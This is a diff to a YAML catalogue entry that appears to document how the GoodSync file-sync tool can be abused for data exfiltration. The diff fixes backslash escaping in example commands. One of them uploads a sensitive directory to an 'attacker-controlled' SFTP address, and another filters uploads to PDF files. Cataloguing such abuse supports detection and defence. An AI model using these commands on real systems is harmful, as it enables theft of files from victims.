@@ -88,11 +88,11 @@ UseCases:
   - Title: Targeted exfiltration using filters
     Description: >
       Include/exclude rules restrict uploads to high-value file types.
-    Command: "gsync sync /dir C:\\Users\Admin /include=*.pdf /exclude=*.iso"
+    Command: "gsync sync /dir C:\\Users\\Admin /include=*.pdf /exclude=*.iso"
   - Title: SFTP-based exfiltration
     Description: >
       Sync job uploads data to attacker-controlled SFTP infrastructure.
-    Command: "gsync sync /dir C:\Sensitive /contact sftp://192.168.1.10/exfil/"
+    Command: "gsync sync /dir C:\\Sensitive /contact sftp://192.168.1.10/exfil/"
   - Title: Persistent automated sync job
     Description: >
       Saved GoodSync job continuously exfiltrates newly created or modified files.
